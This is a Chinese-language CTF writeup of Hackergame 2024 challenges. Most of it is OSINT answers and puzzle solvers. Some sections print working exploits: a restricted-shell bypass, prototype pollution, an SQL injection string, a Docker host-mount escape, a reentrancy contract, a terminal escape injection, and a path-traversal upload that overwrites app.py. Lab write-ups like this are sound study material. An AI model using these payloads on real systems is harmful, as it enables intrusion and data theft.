# 我的 Hackergame 2024 writeup

hackergame 网址 [https://hack.lug.ustc.edu.cn/](https://hack.lug.ustc.edu.cn/)

by huige233 scored 5700 ranked 31

## 签到

按照往年习惯 直接启动看url false改成true 到手

## 喜欢做签到的 CTFer 你们好呀

1.查询中科大图书馆管理网站可得 12

简单搜索招新[主页](https://www.nebuu.la/)可得 

简单翻找js base64转换可得```flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}```

```flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}```

## 猫咪问答（Hackergame 十周年纪念版）

第一问直接搜索对应时间找到教室 可得 3A204

第二问找到中科大官网 先寻找题目数量接近25题的那年 再寻找结束的公告 可得 2682

第三问搜索 Hackergame 2018的猫咪问答可得 程序员的自我修养

第四问搜索论文很好找到 简单阅读之后翻阅到第六页看到 可得336

第五问直接搜索对应事件可得 6e90b6

第六问 寻找llama 3的在线计算算出来1834 跑了几次发现不对 从1820遍历上来的

题外话 llama2的token计算脚本算出来是1827

```flag{@_GOØD_CΛT_1$_the_CA7_Who_CΛn_pΛs5_7HE_QUI2}```

```flag{TEN_y34rs_OF_ha©keЯ9AM3_ØMede7Øu_w!7h_И3k0_qu!z}```

## 打不开的盒

很巧刚好前阵子做了个项目和3d模型相关 用[网页](https://studia3d.com/zh-CN/viewer/)直接看到的

```flag{Dr4W_Us!nG_fR3E_C4D!!w0W}```

## 每日论文太多了！

打开论文搜索flag 过去一看发现的空白一片 复制文字发现flag here

写wp的时候偷懒了 懒得去再下下来在线编辑拿flag出来了

## 比大小王

简单写了个js脚本

```js
(() => {
  const state = {
    inputs: [],
    autoPlay: true,
    delay: 40,
    score1: 0,
  };

  function autoChooseAnswer() {
    if (!state.autoPlay) return;

    const value1 = parseFloat(document.getElementById('value1').textContent);
    const value2 = parseFloat(document.getElementById('value2').textContent);

    let choice = value1 < value2 ? '<' : '>';
    state.inputs.push(choice);

    document.getElementById('answer').textContent = choice;
    document.getElementById('answer').style.backgroundColor = '#5e5';

    state.score1 = state.inputs.length;
    document.getElementById('score1').textContent = state.score1;
    document.getElementById('progress1').style.width = `${state.score1}%`;

    if (state.score1 === 100) {
      submitAnswer();
    } else {
      setTimeout(() => loadNextQuestion(), state.delay);
    }
  }

  function loadNextQuestion() {
    const nextValues = state.values[state.inputs.length];
    if (!nextValues) return;

    document.getElementById('value1').textContent = nextValues[0];
    document.getElementById('value2').textContent = nextValues[1];
    document.getElementById('answer').textContent = '?';
    document.getElementById('answer').style.backgroundColor = '#fff';

    setTimeout(autoChooseAnswer, state.delay);
  }

  function submitAnswer() {
    fetch('/submit', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ inputs: state.inputs }),
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.message);
      document.getElementById('dialog').textContent = data.message;
      document.getElementById('dialog').style.display = 'flex';
    })
    .catch(error => {
      console.log('提交失败，请刷新页面重试');
      document.getElementById('dialog').textContent = '提交失败，请刷新页面重试';
      document.getElementById('dialog').style.display = 'flex';
    });
  }

  function startAutoPlay() {
    fetch('/game', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({})
    })
    .then(response => response.json())
    .then(data => {
      state.values = data.values;
      state.startTime = data.startTime * 1000;
      document.getElementById('value1').textContent = state.values[0][0];
      document.getElementById('value2').textContent = state.values[0][1];
      setTimeout(autoChooseAnswer, state.delay);
    });
  }
  startAutoPlay();
})();

```

控制台打开输入即可 

一点小抱怨 本题在输入过快的情况下会说时空穿越 最后乱填的40过了

## 旅行照片 4.0

1~2问 直接搜索地址 科里科气创驿站找到的 上次音乐会请自行搜索b站

3~4问 注意到图片1上有六安 搜索遍历一次即可 图片2是知名景点、

5~6问 老实说这个折腾了我挺久 把动车段动车所动车运用所都过了一遍 然后发现其实是我车型填错了 车型使用Google智能镜头检索到

医院是积水潭医院

## 不宽的宽字符

简单翻阅代码后发现实际上是utf16le->utf8

notepad2简单构建得到`Z:/theflag 0`   `㩚琯敨汦条Ā`

这里并不能很好的显示 实际构造为`Z:/theflag\000\001`

## PowerfulShell

```
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```

这里贴出Powershell代码 可以看到禁用了非常多的字符

检查环境发现~的目录是/players 已知$- = hB

有以下构造

```
__=~
___=$-
____=$[-1+1]
`${__:7:1}${___:____:1}`
```

构造了一个sh指令 后续就是简单的cd ..和cat /flag了

## Node.js is Web Scale

简单阅读题目源码后 打开环境

设置key为`__proto__.cmd`,value是`cat flag`

访问url/execute?cmd=cmd

## PaoluGPT

这题比较有意思 因为我两个问都是用的同一个解法
先看题目 简单阅读代码后发现实际上是个sql注入漏洞
直接使用`1'or contents like'%flag%'or title like
'%f1ag% `会得到第一个flag
这个时候如果选择去读取结果2 就会得到第二个flag
但是当时的我闲的没事 开关了几次环境...拿到了

## 强大的正则表达式

### Easy

简单阅读题目源码之后发现 Easy难度只需要实现16的取模即可

`(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984|1000))`

构造了一个逆天的表达式

### Medium

仔细阅读代码后发现没办法讨巧 只能使用dfa去硬算一个表达出来

计算出来的结果非常吓人  整整29270字符

放在同目录下好了 [文件](.\regex.txt)

## 惜字如金 3.0

唉xzrj 唉万恶的出题人还在我写题的时候问我写出来没有

太万恶了

只写了A

以下是还原后的文本

```
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                

```



## 优雅的不等式

找到一篇论文 其中记录了几种方法

我解flag1用的是 `(((x**5)*((1-x)**6)*(197+462*(x**2)))/(530*(1+(x**2))))+(151/318)`

## 无法获得的秘密

```小 A 有一台被重重限制的计算机，不仅没有联网，而且你只能通过 VNC 使用键鼠输入，看视频输出。上面有个秘密文件位于 `/secret`，你能帮他把文件**丝毫不差地**带出来吗？```

根据题干所说 只能使用键盘输入 视频输出

找到了一个[项目](https://github.com/ganlvtech/qrcode-file-transfer) 

下载拆解网页后使用js minifier压缩文件 然后打包转换base64后传输 在novnc上跑喷泉码

输入使用脚本

```
import time
import pyautogui

# 读取文件内容
with open('b.txt', 'r', encoding='utf-8') as file:
    content = file.read()

# 等待一段时间以切换到 noVNC 窗口
print("请在 5 秒内切换到 noVNC 窗口...")
time.sleep(5)
pyautogui.PAUSE = 0
# 模拟键盘输入
pyautogui.typewrite(content, interval=0.00001)  # interval 设置每个字符输入间隔
```

题外话：本题的环境其实有websocket提供 可以用ws快速传输

## Docker for Everyone Plus

啧啧 今年真的是超级加倍啊这个docker

仔细检查环境发现 被限制使用极少的指令来实现docker的功能

简单制作一个镜像

使用rz上传到题目环境中

执行命令

```
cat alpine0.tar | sudo /usr/bin/docker image load
sudo /usr/bin/docker run --rm -u 1000:1000 -it --ipc=host --device /dev/vdb -v /:/outside alpine0
```

挂载镜像后login  cat /outside/flag即可得到

## ZFS 文件恢复

看完官方题解之后意识到题目环境是特意设计的

一开始用zdb看到残破的块还在疑惑为什么

对于第二问 可以使用Reclaime Pro进行提取时间和shell脚本

## 链上转账助手

### 转账失败

一开始并没有仔细看这个题 先运行了compile脚本后尝试上传了1的json

之后发现成功的获取到了flag

仔细阅读源码后发现是external payable的原因

### 转账又失败

仔细阅读题目源码后发现 需要进行重入攻击来完成让转账失败

这里给出我的合约

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    mapping(address => uint256) public pendingWithdrawals;

    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        (bool success,) = recipients[0].call{value: amounts[0]}("");
        require(success, "Transfer failed");
    }

    receive() external payable {
        address payable[] memory recipients = new address payable[](1);
        recipients[0] = payable(this);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = msg.value;
        this.batchTransfer{value: msg.value}(recipients, amounts);
    }
}
```



## 不太分布式的软总线

Flag1没什么好说的 就直接对着总线发送 `Please give me flag1`即可

不过要注意需要添加`--system`参数以发送到系统上

Flag2需要先创建管道然后传输dbus指令

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>


int main(int argc, char* argv[])
{
    int pipedes1[2];
    int returnstatus1 = pipe(pipedes1);
    char pipe1writemessage[30] = "Please give me flag2\n";
    char pipestr[42];
    sprintf(pipestr, "%d", pipedes1[0]);

    if (fork() != 0)
    {
        write(pipedes1[1], pipe1writemessage, sizeof(pipe1writemessage));
        printf("Parent writing to pipe 1 - Message is: %s\n", pipe1writemessage);

        char command[] = "gdbus call --system --dest cn.edu.ustc.lug.hack.FlagService --object-path /cn/edu/ustc/lug/hack/FlagService --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 ";
        strcat(command,pipestr);
        FILE *fstream = NULL;
        char buff[1024];
        memset(buff, 0, sizeof(buff));

        if(NULL == (fstream = popen(command,"r")))
        {
            fprintf(stderr,"execute command failed: %s",strerror(3));
            return -1;
        }

        while(NULL != fgets(buff, sizeof(buff), fstream))
        {
            printf("%s",buff);
        }
        pclose(fstream);
    }
    return 0;
}

```

flag3的话 需要不附带任何参数的情况下向终端发送

而且不能使用gdbus命令

自己实现一个就好 需要注意的点就是 需要get的是`DBUS_BUS_SYSTEM`而不是`DBUS_BUS_SESSION`

```
#include <dbus/dbus.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
    DBusError err;
    DBusConnection *conn;
    DBusMessage *msg;
    DBusMessage *reply;
    DBusMessageIter args;
    int ret;
    const char *flag;
    dbus_error_init(&err);
    conn = dbus_bus_get(DBUS_BUS_SYSTEM, &err);
    if (dbus_error_is_set(&err)) {
        fprintf(stderr, "Connection Error (%s)\n", err.message);
        dbus_error_free(&err);
    }
    if (conn == NULL) {
        return 1;
    }

    msg = dbus_message_new_method_call(
        "cn.edu.ustc.lug.hack.FlagService", // 服务名
        "/cn/edu/ustc/lug/hack/FlagService", // 路径
        "cn.edu.ustc.lug.hack.FlagService",  // 接口
        "GetFlag3");                         // 方法
    if (msg == NULL) {
        fprintf(stderr, "Message Null\n");
        return 1;
    }

    reply = dbus_connection_send_with_reply_and_block(conn, msg, -1, &err);
    dbus_message_unref(msg);
    if (dbus_error_is_set(&err)) {
        fprintf(stderr, "Error in sending message: %s\n", err.message);
        dbus_error_free(&err);
        return 1;
    }

    if (!dbus_message_iter_init(reply, &args)) {
        fprintf(stderr, "Reply has no arguments!\n");
    } else if (DBUS_TYPE_STRING != dbus_message_iter_get_arg_type(&args)) {
        fprintf(stderr, "Argument is not string!\n");
    } else {
        dbus_message_iter_get_basic(&args, &flag);
        printf("Flag: %s\n", flag);
    }
    dbus_message_unref(reply);
    dbus_connection_unref(conn);
    return 0;
}

```

## 动画分享

题目提到祖传的终端模拟器是zutty

简单对着终端发送0x03让终端误以为自己已经接受到退出指令

然后跑一个python的fileserver请求flag内容即可

```
#!/usr/bin/env python3

import socket
import time
from contextlib import closing

def send_socket(payload, host="127.0.0.1", port=8000, timeout=2.0):
    try:
        with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(payload)
            return sock.recv(8192).decode()
    except Exception as e:
        return f"Error: {e}"

def main():
    POC_HEADER = b'\x1bP$q\x03\n'
    POC_ENDING = b'\x1b\\\n'
    HTTP_PORT = 7999
    
    try:
        send_socket(POC_HEADER)
        send_socket(f' | (cd / && python3 -m http.server {HTTP_PORT})\n'.encode())
        send_socket(POC_ENDING)

        time.sleep(4)
        
        response = send_socket(
            b'GET /flag2 HTTP/1.1\r\nConnection: close\r\n\r\n',
            port=HTTP_PORT
        )
        print(response)
        
    except Exception as e:
        print(f"执行过程出错: {e}")

if __name__ == "__main__":
    main()

```

改脚本一次能获取两个flag 但是flag2可能有点看运气

## 关灯

唉 看到题目的时候就知道和以前的2D关灯有关系 

一看 3D的

哈哈

简单跑个Z3

```
from z3 import *
import numpy as np

def xor_chain(values):
    """用于处理超过3个参数的XOR，逐步构建链式XOR表达式"""
    result = values[0]
    for value in values[1:]:
        result = Xor(result, value)
    return result

def convert_switch_to_constraints(switch_array, n):
    # 创建Z3的布尔数组
    lights = [[[Bool(f'lights_{i}_{j}_{k}') for k in range(n)] for j in range(n)] for i in range(n)]
    constraints = []

    # 创建灯光状态的约束，使其符合 convert_switch_array_to_lights_array 的逻辑
    for i in range(n):
        for j in range(n):
            for k in range(n):
                neighbors = [
                    switch_array[i][j][k],
                    switch_array[i-1][j][k] if i > 0 else False,
                    switch_array[i+1][j][k] if i < n-1 else False,
                    switch_array[i][j-1][k] if j > 0 else False,
                    switch_array[i][j+1][k] if j < n-1 else False,
                    switch_array[i][j][k-1] if k > 0 else False,
                    switch_array[i][j][k+1] if k < n-1 else False
                ]
                # 使用 xor_chain 将 neighbors 合并为一个 Xor 表达式
                constraints.append(lights[i][j][k] == xor_chain(neighbors))
    return lights, constraints

def solve_puzzle_with_z3(lights_array):
    n = lights_array.shape[0]
    switch_array = [[[Bool(f'switch_{i}_{j}_{k}') for k in range(n)] for j in range(n)] for i in range(n)]

    # 定义灯光状态的约束
    lights, constraints = convert_switch_to_constraints(switch_array, n)
    solver = Solver()

    # 添加灯光状态与目标状态的约束
    for i in range(n):
        for j in range(n):
            for k in range(n):
                if lights_array[i][j][k] == 1:
                    solver.add(lights[i][j][k])
                else:
                    solver.add(Not(lights[i][j][k]))

    # 添加所有约束
    solver.add(constraints)

    # 检查是否有解
    if solver.check() == sat:
        model = solver.model()
        result_switch_array = np.zeros((n, n, n), dtype=np.uint8)
        for i in range(n):
            for j in range(n):
                for k in range(n):
                    if model.evaluate(switch_array[i][j][k]):
                        result_switch_array[i, j, k] = 1
        return result_switch_array
    else:
        raise ValueError("No solution found")

# 主程序
n = int(input("请输入谜题的大小 (如难度3则输入11): "))
lights_input = input("请输入谜题的lights_array (平铺字符串，只有0和1): ").strip()

# 将输入字符串转化为三维数组
lights_array = np.array(list(map(int, lights_input)), dtype=np.uint8).reshape(n, n, n)

# 使用Z3求解
solution_switch_array = solve_puzzle_with_z3(lights_array)

# 输出解谜结果
print("Solution found:")
print("Switch Array:")
print(solution_switch_array)
print("Flattened Answer:", "".join(map(str, solution_switch_array.flatten().tolist())))

```

## 禁止内卷

简单审查题目代码发现是flask的服务器

但是阅读下面的补充说明后发现没有开启DEBUG模式

所以没有办法通过PIN去直接登录管理员

但是开启了reload

所以可以通过路径穿越漏洞把原有的app.py替换掉然后网页自行重启来获取

打开burpsuite 抓包 修改传输路径为`../web/app.py`即可

此处给出修改后的脚本

需要注意的是 脚本中有一个清洗数据的函数 需要注释掉 不然获取到的文件不正确

```
from flask import Flask, render_template, request, flash, redirect
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

UPLOAD_DIR = "/tmp/uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)

# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)


def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        #for idx, i in enumerate(answers):
        #    if i < 0:
        #        answers[idx] = 0
    return answers


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", results=sorted(results))


@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("你忘了上传文件")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)

    answers = get_answer()
    try:
        with open(filepath) as f:
            user = json.load(f)
    except json.decoder.JSONDecodeError:
        flash("你提交的好像不是 JSON")
        return redirect("/")
    try:
        score = 100
    except:
        flash("分数计算出现错误")
        traceback.print_exc()
        return redirect("/")
    # ok, update results
    results.append(answers)
    with open("results.json", "w") as f:
        json.dump(results, f)
        data=json.load(f)
    flash(f"评测成功，你的平方差为 {data}")
    return redirect("/")
```

解析用脚本

```
# 输入数组
numbers = [37, 43, 32, 38, 58, 52, 45, 46, -32, -32, -32, -32, 30, 36, 50, 49, 36, 53, 36, 49, 30, 45, 46, 54, 30, 20, 30, 49, 52, 45, 30, 12, 24, 30, 34, -17, 35, 36, -16, -8, 33, 32, -15, 35, -9, -10, -8, 35, 60, 80, 92, 20, 100, 90, 32, 18, 37, 47, 85, 55, 22, 27, 62, 32, 90, 28, 4, 65, 79, 14, 44, 97, 22, 5, 1, 22, 56, 12, 52, 88, 36, 49, 64, 57, 56, 69, 74, 21, 8, 81, 71, 85, 89, 37, 31, 72, 81, 87, 92, 97, 89, 48, 33, 93, 93, 11, 20, 64, 67, 16, 53, 29, 84, 64, 15, 78, 11, 69, 63, 98, 36, 70, 9, 61, 70, 25, 20, 74, 76, 66, 69, 65, 51, 16, 97, 1, 57, 61, 97, 73, 31, 89, 30, 66, 83, 30, 74, 79, 96, 78, 95, 23, 36, 22, 56, 52, 58, 16, 16, 12, 86, 93, 27, 1, 17, 68, 77, 78, 72, 83, 56, 15, 71, 93, 43, 49, 52, 61, 75, 82, 32, 70, 5, 86, 34, 21, 4, 49, 5, 76, 63, 84, 15, 19, 31, 59, 96, 75, 95, 53, 81, 53, 94, 68, 100, 77, 71, 80, 48, 100, 45, 24, 49, 77, 71, 7, 90, 74, 84, 48, 53, 63, 7, 7, 45, 95, 21, 9, 15, 27, 39, 42, 80, 9, 74, 51, 43, 32, 50, 12, 49, 37, 29, 32, 29, 48, 96, 14, 2, 5, 72, 71, 57, 95, 56, 86, 20, 4, 20, 6, 76, 50, 39, 33, 32, 26, 81, 43, 100, 80, 85, 49, 75, 6, 41, 96, 63, 26, 49, 71, 90, 14, 82, 3, 64, 88, 21, 66, 86, 16, 39, 96, 25, 87, 16, 37, 72, 72, 3, 20, 22, 99, 41, 81, 31, 15, 56, 82, 82, 80, 66, 99, 79, 15, 13, 59, 93, 56, 63, 57, 100, 84, 80, 15, 55, 26, 34, 34, 44, 98, 49, 8, 24, 13, 47, 84, 78, 53, 22, 95, 66, 10, 78, 75, 17, 1, 18, 84, 0, 32, 89, 14, 16, 40, 79, 50, 44, 57, 3, 83, 59, 35, 35, 86, 92, 27, 33, 11, 71, 53, 76, 65, 76, 76, 47, 5, 35, 69, 77, 44, 19, 79, 48, 70, 80, 34, 83, 52, 89, 51, 28, 88, 47, 98, 38, 95, 32, 82, 86, 15, 81, 25, 57, 71, 94, 18, 64, 74, 44, 49, 10, 16, 62, 21, 84, 48, 92, 98, 89, 69, 21, 6, 35, 59, 52, 96, 81, 71, 54, 65, 86, 91, 61, 55, 21, 28, 97, 15, 4, 69, 70, 78, 42, 1, 71, 61, 13, 18, 9, 85, 39, 97, 29, 17, 97, 70, 83, 11, 72, 96, 40, 20, 52, 11, 38, 85, 24, 90, 40, 91, 4, 67, 42, 99, 71, 88, 100, 6, 54, 81, 39, 15, 57, 99, 96, 82, 11, 5, 8, 25, 55, 91, 91, 28, 100, 32, 14, 29, 80, 84]

# 转换为字符并拼接为字符串
flag = ''.join([chr(num + 65) for num in numbers])

print(flag)

```

##  哈希三碰撞

感谢 nyyyddddn 为我提供的ida

换了电脑什么环境都没有真的是抱歉呢

~~这家伙的python甚至还是11.2号装的~~

简单阅读1的伪代码后发现

实际上这是个要求输入三组数据，每组数据都需要是16字符的十六进制字符串

然后会读取每个字符串的哈希值的后四个字节对比 如果一致就给出flag

```
import hashlib
import random

def find_sha256_collision():
    hash_dict = {}
    found = False
    count = 0

    hex_digits = '0123456789abcdef'

    while not found:
        input_str = ''.join(random.choices(hex_digits, k=16))
        count += 1

        input_bytes = bytes.fromhex(input_str)

        h = hashlib.sha256(input_bytes).digest()

        last4 = h[-4:]
        last4_hex = last4.hex()

        if last4_hex in hash_dict:
            inputs = hash_dict[last4_hex]
            if input_str not in inputs:
                inputs.append(input_str)
                if len(inputs) == 3:
                    print(f"经过 {count} 次尝试，找到碰撞")
                    print(f"SHA256 哈希值的最后 4 个字节：{last4_hex}")
                    print("输入值：")
                    for i in inputs:
                        print(i)
                    found = True
        else:
            hash_dict[last4_hex] = [input_str]

find_sha256_collision()

```

## 零知识数独

flag1只需要做出四个数独题就可以了

非常简单 如果你实在不会数独也可以使用[这个](https://sudokuspoiler.com/sudoku/sudoku9)

flag2实际上我做出来了 但是因为zk环境的问题xwx

## 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」

简单阅读脚本后发现是一个通过ai还原原本文本的题目

那就用逐个逐个词猜测还原即可 这里给出还原后的文本

`In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.`

一些吐槽 对于上面的文章还原过程中 有好几个单词的概率<0.004

`screens frenzy
0.00298  -  ' smell'
0.00147 -   'cracking'`

## At the end

今年HG很好玩 就是我的身体情况好像不太支持我继续这样折腾下去了

希望明年的HG还能有精力参加吧
